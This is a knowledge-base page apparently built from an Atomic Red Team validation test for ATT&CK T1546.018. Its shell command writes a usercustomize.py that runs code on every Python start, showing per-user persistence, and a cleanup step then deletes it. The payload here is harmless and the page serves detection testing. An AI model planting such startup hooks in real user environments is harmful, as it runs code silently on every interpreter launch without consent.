---
atomic_guid: "6e78084a-a433-4702-a838-cc7b765d87e8"
title: "Python Startup Hook - usercustomize.py (Linux / MacOS)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1546.018"
attack_technique_name: "Event Triggered Execution: Python Startup Hooks"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.018/T1546.018.yaml"
build_date: "2026-04-26 14:38:40"
executor: "sh"
aliases:
  - "6e78084a-a433-4702-a838-cc7b765d87e8"
  - "Python Startup Hook - usercustomize.py (Linux / MacOS)"
platforms:
  - "linux"
  - "macos"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Python Startup Hook - usercustomize.py (Linux / MacOS)

Executes code via usercustomize.py. This is a per-user persistence mechanism 
that does not require root privileges.

## Metadata

- Atomic GUID: 6e78084a-a433-4702-a838-cc7b765d87e8
- Technique: T1546.018: Event Triggered Execution: Python Startup Hooks
- Platforms: linux, macos
- Executor: sh
- Elevation Required: False
- Dependency Executor: sh
- Source Path: atomics/T1546.018/T1546.018.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1546-event_triggered_execution|T1546.018]]

## Input Arguments

### python_exe

- description: The python binary name to test
- type: String
- default: python3

## Dependencies

Python must be installed and the specified binary (#{python_exe}) must be in the PATH.

### Prerequisite Check

```text
PYTHON_CMD=$(command -v #{python_exe} || command -v python)
if [ -z "$PYTHON_CMD" ]; then exit 1; fi
$PYTHON_CMD -m venv --help >/dev/null 2>&1
```

### Get Prerequisite

```text
echo "Python not found. Please install Python using your package manager (e.g., Debian Based 'sudo apt-get update && sudo apt-get install -y python3 python3-venv', RedHat / CentOS Based 'sudo yum install -y python3 python3-venv || sudo dnf install -y python3 python3-venv', MacOS brew install python3 or brew install python@3.x or the macOS developer tools ('xcode-select --install'))."
```

## Executor

- elevation_required: False
- name: sh

### Command

```sh
PYTHON_EXE=$(command -v #{python_exe} || command -v python)
USER_PACKAGES=$($PYTHON_EXE -c "import site; print(site.getusersitepackages())")
mkdir -p "$USER_PACKAGES"
echo "import os; os.system('date > /tmp/poc.txt')" > "$USER_PACKAGES/usercustomize.py"
if [ -f "$USER_PACKAGES/usercustomize.py" ]; then echo "Success: usercustomize.py created under $USER_PACKAGES\n" $(ls -la "$USER_PACKAGES" | grep usercustomize*); else echo "Failed: usercustomize.py not found under $USER_PACKAGES"; fi
$PYTHON_EXE -c "print('Triggering Hook via usercustomize.py...')"
if [ -f /tmp/poc.txt ]; then echo "Success: poc.txt created under /tmp\n" $(ls -la /tmp/ | grep -w poc.txt); else echo "Failed: /tmp/poc.txt not found"; fi
```

### Cleanup

```sh
PYTHON_CMD=$(command -v #{python_exe} || command -v python)
USER_PACKAGES=$($PYTHON_CMD -S -c "import site; print(site.getusersitepackages())")
if [ ! -f /tmp/poc.txt ] || [ ! -f $USER_PACKAGES/usercustomize.py ]; then echo "[!] Artifact missing: /tmp/poc.txt and $USER_PACKAGES/usercustomize.py — [-] Please Run : Invoke-AtomicTest T1546.018"; exit 0; fi
if [ -e "$USER_PACKAGES"/usercustomize* ]; then echo "[+] Successful remove $USER_PACKAGES/usercustomize.py\n" $(rm -rf "$USER_PACKAGES"/usercustomize*); else echo "usercustomize.py not found under $USER_PACKAGES"; fi
rm -rf /tmp/poc.txt
echo "[+] Successful remove poc.txt under /tmp"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.018/T1546.018.yaml)
